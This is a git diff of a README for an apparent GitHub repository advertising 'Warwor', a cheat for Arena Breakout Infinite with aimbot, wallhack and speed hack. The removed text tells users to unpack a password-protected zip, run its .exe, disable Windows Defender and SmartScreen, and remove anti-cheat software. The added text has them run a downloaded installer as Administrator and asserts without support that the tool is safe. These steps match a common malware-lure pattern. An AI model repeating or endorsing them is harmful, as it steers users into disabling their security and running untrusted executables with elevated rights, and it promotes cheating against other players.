@@ -1,63 +1,87 @@
-# Warwor Cheat for Arena Breakout
-<p align="center">
-    <img src="https://github.com/user-attachments/assets/6ff5aa05-5adb-4f0f-b2a9-37bd72f91225" width="400">
-    <img src="https://github.com/user-attachments/assets/6816ee1b-fbb5-48c5-9160-1337ed76518e" width="400">
-</p>
+# 🎮 Arena-Breakout-Warwor-Cheat - Simplest Way to Enhance Your Game
 
-## Description
-Cheat is undetected and up to date. ✅
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/EnesNazmiGun/Arena-Breakout-Warwor-Cheat/releases)
 
-This time we have a slightly unusual novelty: the safest and simplest software for Arena Breakout Infinite. This cheat is called Warwor. Speaking of the contents of the product, it is worth noting that all the necessary basic types of hacking are present here: ESP showing players, Aimbot, Wh showing boxes and some other features. Using the Warwor cheat greatly facilitates the game and makes it more enjoyable. 🏆
----
-## How to Use
-1. **Get the Latest Version**: (https://github.com/Zashlia/Arena-Breakout-Warwor-Cheat/releases/download/latest/Warwor.zip).
-2. **Unzip the Files**: Use pass `Warwor` to unpack.
-3. **Run the Application**: Execute the `.exe` file. (If it doesn't work, contact the developer.)
-4. **In-Game Key**: Press `HOME` to activate.
+## ✨ Introduction
 
-## Technical Specifications:
-- **Supported Operating Systems**: Windows 10 / Windows 11
-- **Compatible Processors**: Intel and AMD
-- **Game Modes Supported**: Windowed Mode, Borderless Mode
+Welcome to the Arena-Breakout-Warwor-Cheat repository! This program offers the simplest and safest way to enhance your experience in Arena Breakout Infinite. With Warwor, you will gain access to essential hacking features like player ESP, an Aimbot, and other helpful tools.
 
----
+## 🚀 Getting Started
 
-## System Requirements:
-- Disable **Windows Defender** and **Smart Screen**.
-- Remove anti-cheats **Faceit** and **Vanguard**.
+To get started with the Arena-Breakout-Warwor-Cheat, follow these steps. You don’t need programming knowledge to use this application. Just follow the instructions carefully.
 
----
+## 📥 Download & Install
 
-## Aimbot
-- **Aimbot** - auto-aim assistance when shooting
-- **Speed (Smooth)** - smoothness of aim movement
-- **FOV** - targeting area radius
-- **Target Bone** - body part prioritization (head/chest/etc)
-- **Aim Key** - hold-to-activate hotkey
-- **Target Line** - visual line to current target
-- **Visible Check** - only target visible enemies
-- **Target Players** - toggle for player targeting
-- **Target Bots** - toggle for AI targeting
-- **Draw FOV** - show targeting radius circle
-- **Instant Hit** - bullets hit instantly (no bullet drop/travel)
+1. **Visit the Releases Page:** Click the link below to go to the release page:
+   [Download from Releases](https://github.com/EnesNazmiGun/Arena-Breakout-Warwor-Cheat/releases)
 
-## Wallhack (ESP)
-### Entities
-- **Players ESP** - highlight enemy players
-- **Bots ESP** - highlight AI enemies
-- **Corpses** - show dead bodies
-- **Containers** - loot containers
-- **Ground Items** - world loot items
+2. **Select the Latest Version:** On the releases page, find the latest version of Warwor. Look for the version number to ensure you have the most up-to-date features and fixes.
 
-### Visual Style
-- **Box ESP** - 3D boxes around targets
-- **Skeleton** - bone structure overlay
-- **Line ESP** - direction lines to targets
-- **Head Dot** - enemy head indicators
+3. **Download the Installation File:** Click on the installation file link to start the download. It may be named something simple like `Warwor_Setup.exe`. 
 
-### Information
-- **Distance** - show target distance
-- **Names** - display player nicknames
-- **Enemy Only** - hide ally ESP
+4. **Run the Installer:** After the download is complete, locate the file in your Downloads folder. Double-click on it to run the installer.
 
----
+5. **Follow the Installation Instructions:** The installer will guide you through the installation process. Just follow the prompts and make your selections. 
+
+6. **Launch the Software:** Once the installation is complete, locate the Warwor icon on your desktop or in your Start Menu. Click it to start the application.
+
+## 💻 System Requirements
+
+Ensure your computer meets the following requirements to run Warwor smoothly:
+
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel Core i3 or equivalent
+- **RAM:** 4 GB minimum
+- **Storage:** At least 500 MB of free space
+- **Graphics:** A dedicated graphics card is recommended
+
+## 🔍 Features
+
+Warwor provides several powerful features to enhance your gaming experience:
+
+- **ESP (Extra Sensory Perception):** See player locations through walls.
+- **Aimbot:** Automatically aim at opponents to improve your accuracy.
+- **WH (Wall Hack):** View through walls to spot items and enemies.
+- **Speed Hack:** Move faster than normal to evade opponents.
+- **Radar:** Handy visual representation of player locations and items.
+
+## ⚙️ How to Use Warwor
+
+### Step 1: Launch the Application
+
+Once installed, launch Warwor from your desktop or Start Menu. 
+
+### Step 2: Configure Settings
+
+- Use the menu to access settings.
+- Toggle features like ESP, Aimbot, and Speed Hack on or off based on your preferences.
+
+### Step 3: Start Playing
+
+With Warwor running in the background, open Arena Breakout Infinite and enjoy the enhanced features. 
+
+## 📖 Troubleshooting
+
+If you encounter issues during installation or use, try these steps:
+
+1. **Check for Updates:** Make sure you downloaded the latest version of Warwor.
+2. **Restart Your Computer:** Sometimes, a simple restart can resolve conflicts.
+3. **Run as Administrator:** Right-click the Warwor icon and select "Run as Administrator" for proper permissions.
+4. **Consult the Community:** If problems persist, feel free to ask in the community forums for assistance.
+
+## 🎯 Frequently Asked Questions
+
+**Q: Is Warwor safe to use?**  
+A: Yes, Warwor is designed with safety in mind. It follows best practices to minimize risks while providing useful features.
+
+**Q: Can I use Warwor with other games?**  
+A: Warwor is specifically designed for Arena Breakout Infinite. Use it only for its intended game.
+
+**Q: Do I need to update Warwor frequently?**  
+A: Yes, regular updates are important to ensure you have the latest features and security fixes.
+
+## 📞 Support
+
+If you have any questions or need help, please reach out via the GitHub Issues page. We are here to assist you!
+
+[Download from Releases](https://github.com/EnesNazmiGun/Arena-Breakout-Warwor-Cheat/releases)
